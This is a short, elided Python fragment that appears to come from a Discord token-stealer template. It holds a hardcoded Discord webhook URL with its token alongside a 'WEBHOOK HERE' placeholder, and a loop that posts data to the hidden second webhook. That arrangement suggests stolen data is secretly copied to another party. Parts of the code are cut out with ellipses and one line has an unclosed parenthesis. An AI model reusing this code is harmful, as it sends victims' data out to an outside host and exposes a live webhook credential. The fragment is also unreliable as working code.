...
wh00k2 = "https://discord.com/api/webhooks/1132656415517978686/nVlUyFtPsTbPilJdmBcBGGvHW6nu60WC_ygoWv7_ErKXHWrxAOh3PxvQOeReDnP4j9rm"
wh00k = "WEBHOOK HERE"
    ...
    for i in range(8):
        try:
            if headers != '':
                ...
                e = urlopen(Request(wh00k2, data=data)
                return r, e
            else:
